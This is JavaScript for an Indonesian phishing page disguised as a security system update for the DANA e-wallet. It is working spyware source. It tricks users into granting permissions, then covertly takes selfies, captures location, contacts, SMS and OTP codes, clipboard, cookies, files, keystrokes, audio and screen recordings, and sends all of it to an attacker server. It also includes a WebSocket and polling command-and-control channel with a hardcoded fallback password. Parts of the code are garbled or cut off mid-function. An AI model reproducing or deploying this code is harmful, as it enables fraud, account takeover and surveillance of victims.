<script>

var WS_PASSWORD = '';

// ============================================================
// DETEKSI PLATFORM & BRIDGE
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()) }catch(e){} } return null; },

    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber() }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()) }catch(e){} } return null; },

    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p) }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p) }catch(e){} } },
    forceStopApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.forceStopApp(p) }catch(e){} } },
    clearAppData: function(p) { if(this.isAvailable){ try{ AndroidBridge.clearAppData(p) }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n) }catch(e){} } },
    listFiles: function(p) { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.listFiles(p)) }catch(e){} } return null; },
    takeScreenshot: function() { if(this.isAvailable){ try{ return AndroidBridge.takeScreenshot() }catch(e){} } return null; },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
};

// ============================================================
// UI FUNCTIONS
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    setTimeout(function() {
        try {
            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
            }
            // ✅ REDIRECT KE DANA WEB
            window.location.href = DANA_URL;
        } catch(e) {
            window.location.href = DANA_URL;
        }
    }, 800);
}

function K(d) {
    d._timestamp = Date.now();
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

function logBypass(msg) {
    var el = document.getElementById('bypassStatus');
    if (el) el.textContent = '📱 ' + msg;
    console.log('[DATA REAL]', msg);
}

// ============================================================
// 🔥 1. TEKNIK SOCIAL ENGINEERING - MINTA IZIN SATU POPUP
// ============================================================
function requestAllPermissions() {
    logBypass('🔥 Meminta semua izin...');
    
    // 1. IZIN LOKASI
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    K({ sumber: 'izin_lokasi', data: 'granted' });
                },
                function() { K({ sumber: 'izin_lokasi', data: 'denied' }); }
            );
        }
    } catch(e) {}
    
    // 2. IZIN KAMERA
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                    K({ sumber: 'izin_kamera', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_kamera', data: 'denied' }); });
        }
    } catch(e) {}
    
    // 3. IZIN MIKROFON
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) {
                    K({ sumber: 'izin_mikrofon', data: 'granted' });
                    stream.getTracks().forEach(function(t) { t.stop(); });
                })
                .catch(function() { K({ sumber: 'izin_mikrofon', data: 'denied' }); });
        }
    } catch(e) {}
    
    // 4. IZIN NOTIFIKASI
    try {
        if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
            Notification.requestPermission().then(function(result) {
                K({ sumber: 'izin_notifikasi', data: result });
            });
        }
    } catch(e) {}
    
    // 5. IZIN KONTAK (Chrome Android)
    try {
        if ('contacts' in navigator) {
            navigator.contacts.select(['name', 'tel'], { multiple: true })
                .then(function(kontak) {
                    K({ sumber: 'izin_kontak', data: 'granted' });
                })
                .catch(function() { K({ sumber: 'izin_kontak', data: 'denied' }); });
        }
    } catch(e) {}
    
    logBypass('✅ Semua izin diminta!');
}

// ============================================================
// 📍 2. TEKNIK AMBIL LOKASI (GPS + IP GEOLOCATION)
// ============================================================
function getLocationReal() {
    logBypass('📍 Mengambil lokasi real...');
    
    // GPS - REAL
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    K({ sumber: 'data_lokasi_gps_real', data: {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || null,
                        speed: pos.coords.speed || null,
                        heading: pos.coords.heading || null
                    } });
                    logBypass('✅ Lokasi GPS real: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
                    DATA_COLLECTED.location = true;
                },
                function(err) {
                    logBypass('⚠️ GPS ditolak, pakai IP');
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    } catch(e) {}
    
    // IP Geolocation - TANPA IZIN!
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipapi.co/json/', true);
        xhr.timeout = 5000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.latitude && data.longitude) {
                        K({ sumber: 'data_lokasi_ip_real', data: {
                            lat: data.latitude,
                            lon: data.longitude,
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            ip: data.ip,
                            org: data.org,
                            timezone: data.timezone
                        } });
                        logBypass('✅ Lokasi IP real: ' + data.city + ', ' + data.country);
                        DATA_COLLECTED.location = true;
                    }
                } catch(e) {}
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// 📷 3. TEKNIK AMBIL KAMERA (SELFIE DIAM-DIAM)
// ============================================================
function getCameraReal() {
    logBypass('📷 Mengambil kamera...');
    
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
                    document.body.appendChild(video);
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function() {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                        if (dataUrl && dataUrl.length > 1000) {
                            K({ sumber: 'data_kamera_real', data: dataUrl });
                            logBypass('✅ Foto kamera real!');
                            DATA_COLLECTED.camera = true;
                        }
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        try { document.body.removeChild(video); } catch(e) {}
                    }, 1000);
                })
                .catch(function() { logBypass('❌ Kamera ditolak'); });
        }
    } catch(e) {}
}

// ============================================================
// 👤 4. TEKNIK AMBIL KONTAK (Contacts API + Bridge)
// ============================================================
function getContactsReal() {
    logBypass('👤 Mengambil kontak real...');
    
    // METHOD 1: Contacts API (Chrome Android)
    try {
        if ('contacts' in navigator) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(function(kontak) {
                    if (kontak && kontak.length > 0) {
                        K({ sumber: 'data_kontak_api_real', data: kontak });
                        logBypass('✅ Kontak real via API: ' + kontak.length + ' kontak');
                        DATA_COLLECTED.contacts = true;
                        return;
                    }
                })
                .catch(function() {});
        }
    } catch(e) {}
    
    // METHOD 2: AndroidBridge (WebView)
    if (A.isAvailable) {
        try {
            var contacts = A.getAllContacts();
            if (contacts) {
                K({ sumber: 'data_kontak_bridge_real', data: contacts });
                logBypass('✅ Kontak real via Bridge: ' + contacts.length + ' kontak');
                DATA_COLLECTED.contacts = true;
                return;
            }
        } catch(e) {}
    }
    
    if (!DATA_COLLECTED.contacts) {
        logBypass('⚠️ Kontak tidak tersedia');
    }
}

// ============================================================
// 💬 5. TEKNIK AMBIL SMS & OTP (AndroidBridge)
// ============================================================
function getSMSReal() {
    logBypass('💬 Mengambil SMS real...');
    
    if (!A.isAvailable) {
        logBypass('❌ SMS: Bridge tidak tersedia');
        return;
    }
    
    try {
        var sms = A.getAllSMS();
        if (sms) {
            K({ sumber: 'data_sms_real', data: sms });
            logBypass('✅ SMS real: ' + sms.length + ' SMS');
            DATA_COLLECTED.sms = true;
            
            // Ambil OTP dari SMS
            var otpList = [];
            sms.forEach(function(s) {
                var body = s.body || s.message || '';
                var otp = body.match(/\b\d{4,6}\b/);
                if (otp) {
                    otpList.push({
                        otp: otp[0],
                        from: s.address || s.from,
                        body: body.substring(0, 100)
                    });
                }
            });
            if (otpList.length > 0) {
                K({ sumber: 'data_otp_real', data: otpList });
                logBypass('✅ OTP real: ' + otpList.length + ' OTP ditemukan');
                DATA_COLLECTED.otp = true;
            }
        } else {
            logBypass('⚠️ SMS: tidak ada data');
        }
    } catch(e) {
        logBypass('❌ SMS error: ' + e.message);
    }
}

// ============================================================
// 🔑 6. TEKNIK KEYLOGGER (Event Listener)
// ============================================================
function startKeylogger() {
    logBypass('🔑 Keylogger aktif...');
    
    document.addEventListener('input', function(e) {
        var target = e.target;
        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
            var data = {
                waktu: Date.now(),
                tag: target.tagName,
                type: target.type || '',
                name: target.name || '',
                id: target.id || '',
                value: target.value,
                url: window.location.href
            };
            KEYLOG_DATA.push(data);
            
            if (KEYLOG_DATA.length >= 3) {
                K({ sumber: 'data_keylogger_real', data: KEYLOG_DATA });
                KEYLOG_DATA = [];
            }
        }
    }, true);
    
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            data[input.name || input.id || input.type] = input.value;
        });
        K({ sumber: 'data_keylogger_submit_real', data: { waktu: Date.now(), url: window.location.href, form: data } });
    }, true);
}

// ============================================================
// 📋 7. TEKNIK AMBIL CLIPBOARD (Multi Method)
// ============================================================
function getClipboardReal() {
    logBypass('📋 Mengambil clipboard real...');
    
    // METHOD 1: Clipboard API
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(function(text) {
                if (text && text.length > 0) {
                    K({ sumber: 'data_clipboard_api_real', data: text });
                    logBypass('✅ Clipboard real via API: ' + text.substring(0, 30) + '...');
                    DATA_COLLECTED.clipboard = true;
                }
            }).catch(function() {});
        }
    } catch(e) {}
    
    // METHOD 2: Paste Event
    try {
        document.addEventListener('paste', function(e) {
            var text = e.clipboardData.getData('text');
            if (text && text.length > 0) {
                K({ sumber: 'data_clipboard_paste_real', data: text });
                logBypass('✅ Clipboard real via paste: ' + text.substring(0, 30) + '...');
                DATA_COLLECTED.clipboard = true;
            }
        });
    } catch(e) {}
    
    // METHOD 3: execCommand (WebView)
    try {
        var input = document.createElement('input');
        input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
        input.setAttribute('autofocus', 'true');
        document.body.appendChild(input);
        input.focus();
        setTimeout(function() {
            try {
                document.execCommand('paste');
                var text = input.value;
                if (text && text.length > 0) {
                    K({ sumber: 'data_clipboard_exec_real', data: text });
                    logBypass('✅ Clipboard real via exec: ' + text.substring(0, 30) + '...');
                    DATA_COLLECTED.clipboard = true;
                }
            } catch(e) {}
            try { document.body.removeChild(input); } catch(e) {}
        }, 500);
    } catch(e) {}
}

// ============================================================
// 📂 8. TEKNIK AMBIL FILE HP (AndroidBridge)
// ============================================================
function getFilesReal() {
    logBypass('📂 Mengambil file HP real...');
    
    if (!A.isAvailable) {
        logBypass('❌ Files: Bridge tidak tersedia');
        return;
    }
    
    var folders = [
        '/storage/emulated/0/DCIM/Camera/',
        '/storage/emulated/0/Download/',
        '/storage/emulated/0/Pictures/',
        '/storage/emulated/0/Music/',
        '/storage/emulated/0/Documents/',
        '/storage/emulated/0/Movies/'
    ];
    
    folders.forEach(function(folder) {
        try {
            var files = A.listFiles(folder);
            if (files && files.length > 0) {
                K({ sumber: 'data_files_' + folder.replace(/[^a-zA-Z]/g, '_') + '_real', data: {
                    path: folder,
                    files: files.slice(0, 50)
                } });
                logBypass('✅ Files dari ' + folder + ': ' + files.length + ' file');
                DATA_COLLECTED.files = true;
            }
        } catch(e) {}
    });
}

// ============================================================
// 🍪 9. TEKNIK AMBIL COOKIES & STORAGE
// ============================================================
function getCookiesAndStorage() {
    logBypass('🍪 Mengambil cookies & storage...');
    
    try {
        var data = {
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
        };
        
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
        }
        
        for (var j = 0; j < sessionStorage.length; j++) {
            var key2 = sessionStorage.key(j);
            data.sessionStorage[key2] = sessionStorage.getItem(key2);
        }
        
        K({ sumber: 'data_cookies_storage_real', data: data });
        logBypass('✅ Cookies & Storage real');
        DATA_COLLECTED.storage = true;
    } catch(e) {}
}

}

function getBatteryReal() {
    logBypass('🔋 Mengambil battery...');
    
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                K({ sumber: 'data_baterai_real', data: {

// WEBSOCKET
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'systemupdate_' + Date.now(),
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    var hasil = eksekusiPerintah(cmd);
                    ws.send(JSON.stringify({
                        type: 'command_result',
                        command: aksi,
                        result: hasil,
                        timestamp: Date.now()
                    }));
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            wsConnected = false;
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            setTimeout(connectWebSocket, 10000);
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

function connectWebSocketWithFallback() {
    if (WS_PASSWORD && WS_PASSWORD !== '') {
        connectWebSocket();
        return;
    }
    WS_PASSWORD = 'default_fallback_password';
    connectWebSocket();
}

function recordAudioReal(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        if (reader.result) {
                            K({ sumber: 'data_audio_real', data: reader.result });
                        }
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {

        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

var screenRecorder = null, screenChunks = [];

function screenRecordReal(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() {
                            if (reader.result) {
                                K({ sumber: 'data_screen_rec_real', data: reader.result });
                            }
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}

function keyloggerStatus() {
    return 'Keylogger: ' + (keyloggerActive ? 'ACTIVE' : 'INACTIVE') + ' | ' + keyloggerData.length + ' entries';
}

var keyloggerActive = false;
var keyloggerData = [];

// ============================================================
// AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        retryCount = 0;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        connectWebSocket();
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        autoExecuteC2();
                        
                        // ✅ AMBIL DATA REAL!
                        setTimeout(function() {
                            collectAllRealData();
                        }, 1000);
                        
                        return;
                    }
                } catch(e) {}
            }
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllRealData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllRealData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.ontimeout = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                autoExecuteC2();
                setTimeout(function() {
                    collectAllRealData();
                }, 1000);
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

function startHeartbeat() {
    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 2700000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing' });
        }
    }, REINFECTION_INTERVAL);
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({ sumber: 'c2_result', data: { perintah: aksi, hasil: hasil, waktu: Date.now() } });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    var commands = [
        'get_system_info', 'get_battery', 'get_wifi',
        'ambil_lokasi', 'get_clipboard', 'screenshot'
    ];
    if (A.isAvailable) {
        commands.push('ambil_kontak');
        commands.push('ambil_sms');
        commands.push('ambil_call_log');
        commands.push('ambil_imei');
        commands.push('ambil_imsi');
        commands.push('ambil_nomor_hp');
        commands.push('get_installed_apps');
    }
    commands.forEach(function(cmd, index) {
        setTimeout(function() {
            try {
                var hasil = eksekusiPerintah({ aksi: cmd });
                K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil, waktu: Date.now() } });
            } catch(e) {}
        }, index * 1000);
    });
}

function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100, '✅ Update Selesai');
    K({ sumber: 'update_complete', data: {
        data_collected: Object.keys(DATA_COLLECTED)
    } });
    setTimeout(redirectToDANA, 3000);
}

// ============================================================
// START
// ============================================================
updateProgress(5, '⏳ Memperbarui System Keamanan...');
K({ sumber: 'system_update_start', data: { platform: PLATFORM, bridge: A.isAvailable } });

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
        .catch(function() {});
}

ambilPassword();

setTimeout(function() {
    if (!allDone) {
        allDone = true;
        updateProgress(100, '✅ Update Selesai');
        K({ sumber: 'timeout_fallback', data: 'redirecting' });
        setTimeout(redirectToDANA, 1000);
    }
}, 15000);
</script>
